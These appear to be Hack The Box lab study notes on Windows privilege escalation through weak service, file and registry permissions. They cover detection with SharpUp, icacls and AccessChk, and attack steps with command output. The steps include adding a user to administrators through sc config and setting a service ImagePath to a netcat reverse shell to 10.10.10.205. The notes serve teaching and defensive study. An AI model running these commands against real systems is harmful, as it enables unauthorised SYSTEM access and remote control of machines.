# Section 17: Weak Permissions

---

## Overview

> [!info] What are Weak Permissions?
> Misconfigurations in file system and service ACLs that grant excessive access to users, groups, or processes. **Common in third-party software, open-source, and custom applications** — relatively rare in large vendor software. Services run with SYSTEM privileges, making service-related flaws particularly dangerous.

---

### Identifying Vulnerable Services

#### Using SharpUp

**Tool:** [SharpUp](https://github.com/GhostPack/SharpUp/) (GhostPack suite) 

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

> [!note] SharpUp Output
> Identifies services with weak ACLs on their binary files
> Shows service configuration details including path and state

#### Checking Permissions with icacls
[icacls](https://ss64.com/nt/icacls.html)

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

> [!danger] Vulnerability Found
> - **BUILTIN\Users** have **(I)(F)** = Inherited Full access
> - **Everyone** has **(I)(F)** = Inherited Full access
> - **Any unprivileged user** can manipulate the directory and contents

### Exploitation: Service Binary Replacement

**Impact:** Replace service binary with malicious executable

```cmd
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\htb> sc start SecurityService
```

**Possible Payloads:**
- Reverse shell as SYSTEM
- Add local admin user
- Full administrative control


#### Checking Permissions with AccessChk
#### Using AccessChk from Sysinternals

**Tool:** [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) (Sysinternals suite)

```cmd
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

**AccessChk Flags Explained:**
- `-q` = Omit banner
- `-u` = Suppress errors
- `-v` = Verbose output
- `-c` = Specify Windows service name
- `-w` = Show only objects with write access

> [!danger] Critical Finding
> **NT AUTHORITY\Authenticated Users** have **SERVICE_ALL_ACCESS**
> This means any authenticated user has full read/write control over the service

### Exploitation: Modify Service Binary Path

**Step 1: Change Service Binary Path**

```cmd
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

> [!tip] Malicious Payloads
> Instead of adding to admin group, you could use:
> - Reverse shell binary path
> - Command execution payload
> - User creation commands

**Step 2: Stop the Service**

```cmd
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

**Step 3: Start the Service (Executes Malicious Command)**

```cmd
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

> [!note] Expected Error
> Service fails because binpath doesn't point to actual executable
> **However**, the malicious command executes during startup attempt before error

**Step 4: Verify Privilege Escalation**

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

> [!success] Exploitation Successful
> `htb-student` is now part of administrators group!

### Real-World Example: Windows Update Orchestrator Service (UsoSvc)

> [!info] CVE-2019-1322
> - **Service:** Windows Update Orchestrator Service (UsoSvc)
> - **Privilege:** Runs as NT AUTHORITY\SYSTEM
> - **Vulnerability:** Weak permissions allowed modification of service binary path

## Unquoted Service Path

### Vulnerability Overview

> [!danger] What is an Unquoted Service Path?
> Service registry configuration specifies path to binary without quotes. Windows attempts to locate binary by interpreting spaces as delimiters, trying multiple paths in sequence.

### Example Vulnerable Path

```
Service Binary Path: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows attempts execution in this order (`.exe` implied):

1. `C:\Program`
2. `C:\Program Files`
3. `C:\Program Files (x86)\System`
4. `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

#### Querying Specific Service

```cmd
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```


### Exploitation Requirements

To exploit, attacker would need to create:

```
C:\Program.exe\
C:\Program Files (x86)\System.exe
```

### Exploitation Challenges

- Creating files in root drive or Program Files requires **administrative privileges**
- Even if misconfigured, **requires system restart** to elevate privileges (unless service can be restarted by user)
- Not often exploitable in practice, though unquoted paths are common

### Identifying Unquoted Service Paths

```cmd
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

**Command Filters:**
- `findstr /i "auto"` = Auto-start services only
- `findstr /i /v "c:\windows\\"` = Exclude system services
- `findstr /i /v """` = Show only unquoted paths (no quotes)

## Permissive Registry ACLs

### Vulnerability Overview

> [!warning] Registry Permission Misconfiguration
> Services can be configured via registry with weak ACLs, allowing unprivileged users to modify service binaries and gain SYSTEM privileges.

### Checking Service ACLs in Registry

```cmd
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP>
```

**AccessChk Flags:**
- `-k` = Registry key
- `-v` = Verbose
- `-u` = Suppress errors
- `-q` = Omit banner
- `-s` = Recurse
- `-w` = Show write access only

### Exploitation: Modify ImagePath Registry Value

```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

> [!tip] Exploitation Method
> Modify the **ImagePath** registry value to execute arbitrary command:
> - Reverse shell
> - Add admin user
> - Any command execution payload

### Exploitation Conditions

If attacker has **write permissions** to registry for binary path or can **overwrite the binary**:
- Can escalate privileges to user running at next logon
- Can establish persistence
- Can execute arbitrary code in user's security context

Common autorun registry paths:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

## Attack Workflow Summary

### File System ACL Attack

1. **Identify** vulnerable service with permissive file ACLs (SharpUp/icacls)
2. **Create** malicious binary with same name
3. **Replace** original binary
4. **Start/Restart** service
5. **Gain** SYSTEM-level code execution

### Service Permission Attack

1. **Identify** service with weak permissions (SharpUp/accesschk)
2. **Modify** service configuration (sc config)
3. **Stop** the service
4. **Start** the service (executes malicious command)
5. **Verify** privilege escalation achieved

### Registry ACL Attack

1. **Identify** service with weak registry permissions (accesschk -kvuqsw)
2. **Modify** ImagePath registry value (Set-ItemProperty)
3. **Stop/Start** service or wait for next execution
4. **Gain** elevated code execution
